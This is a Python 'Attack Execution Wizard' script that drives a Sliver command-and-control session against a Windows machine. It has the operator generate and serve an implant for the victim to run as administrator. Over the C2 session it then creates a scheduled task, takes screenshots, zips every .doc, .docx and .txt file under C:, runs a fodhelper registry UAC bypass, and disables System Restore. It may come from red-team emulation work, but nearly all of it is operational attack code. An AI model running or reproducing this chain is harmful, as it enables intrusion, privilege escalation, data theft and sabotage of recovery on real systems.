
import asyncio
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from typing import Dict
console = Console()
user_params: Dict[str, str] = {}
def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )
def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")
def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    styled_prompt = f"[bold bright_cyan]{prompt}[/]"
    return Confirm.ask(
        styled_prompt,
        default="y",
        choices=["y", "n"],
        show_default=False,
    )      
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/Aurora-executor-demo/config.ini")
    from attack_executor.post_exploit.Sliver import SliverExecutor
    sliver_executor = SliverExecutor(config=config)
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
        """)
    confirm_action()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH} as Admin (Root)
        """)
    confirm_action()


    # Sliver-session selection
    console.print("[bold cyan]\n[Sliver Executor] Session Selection[/]")
    sliver_sessionid = await sliver_executor.select_sessions()

    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 5 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: task_command[/]")
    console.print(f"  Description: What you want to execute")
    default_val = "C:\windows\system32\cmd.exe"
    user_input = console.input(
        f"[bold]➤ Enter value for task_command [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: task_command")
    user_params["task_command"] = user_input

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 5 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: time[/]")
    console.print(f"  Description: What time 24 Hour")
    default_val = "1210"
    user_input = console.input(
        f"[bold]➤ Enter value for time [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: time")
    user_params["time"] = user_input
    commands = f"""
    SCHTASKS /Create /SC ONCE /TN spawn /TR {user_params["task_command"]} /ST {user_params["time"]}
    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()


    user_params["SessionID"] = sliver_sessionid

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 8 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: remote_path[/]")
    console.print(f"  Description: Full path of the directory to create")
    default_val = r""
    user_input = console.input(
        f"[bold]➤ Enter value for remote_path [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: remote_path")
    user_params["remote_path"] = user_input

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: mkdir[/]")
    confirm_action()
    try:
        await sliver_executor.mkdir(user_params["remote_path"], user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 9 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: output_file[/]")
    console.print(f"  Description: Location to save zipped file or folder")
    default_val = r"None"
    user_input = console.input(
        f"[bold]➤ Enter value for output_file [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: output_file")
    user_params["output_file"] = user_input

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 9 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: input_file[/]")
    console.print(f"  Description: Location of file or folder to zip")
    default_val = r"None"
    user_input = console.input(
        f"[bold]➤ Enter value for input_file [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: input_file")
    user_params["input_file"] = user_input
    commands = rf"""
    Compress-Archive -Path "{user_params["input_file"]}" -DestinationPath {user_params["output_file"]} -Force

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 10 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: output_file[/]")
    console.print(f"  Description: Path where captured results will be placed")
    default_val = r"$env:TEMP\T1113.png"
    user_input = console.input(
        f"[bold]➤ Enter value for output_file [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: output_file")
    user_params["output_file"] = user_input
    commands = rf"""
    Add-Type -AssemblyName System.Windows.Forms;$screen = [Windows.Forms.SystemInformation]::VirtualScreen;$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height;$graphic = [Drawing.Graphics]::FromImage($bitmap);$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size);$bitmap.Save("{user_params["output_file"]}")

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 11 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: output_zip_folder_path[/]")
    console.print(f"  Description: Path to directory for saving the generated zip file")
    default_val = r"PathToAtomicsFolder\..\ExternalPayloads\T1005"
    user_input = console.input(
        f"[bold]➤ Enter value for output_zip_folder_path [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: output_zip_folder_path")
    user_params["output_zip_folder_path"] = user_input
    commands = """
    $startingDirectory="C:"; $outputZip="#{output_zip_folder_path}"; $fileExtensions=@(".doc",".docx",".txt"); New-Item -Type Directory $outputZip -Force -ErrorAction Ignore | Out-Null; Get-ChildItem -Path $startingDirectory -Recurse -File | Where-Object {$_.Extension -in $fileExtensions} | ForEach-Object -Begin {$files=@()} -Process {$files += $_.FullName} -End {if ($files) { Compress-Archive -Path $files -DestinationPath "$outputZip\data.zip"; Write-Host "Zip file created: $outputZip\data.zip" } else { Write-Host "No files found" }}

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 12 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: executable_binary[/]")
    console.print(f"  Description: Binary to execute with UAC Bypass")
    default_val = r"C:\Windows\System32\cmd.exe"
    user_input = console.input(
        f"[bold]➤ Enter value for executable_binary [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: executable_binary")
    user_params["executable_binary"] = user_input
    commands = rf"""
    New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
    New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "{user_params["executable_binary"]}" -Force
    Start-Process "C:\Windows\System32\fodhelper.exe"

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()


    confirm_action()
    commands = """
    schtasks.exe /Change /TN \"\Microsoft\Windows\SystemRestore\SR\" /disable

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

if __name__ == "__main__":
    asyncio.run(main())
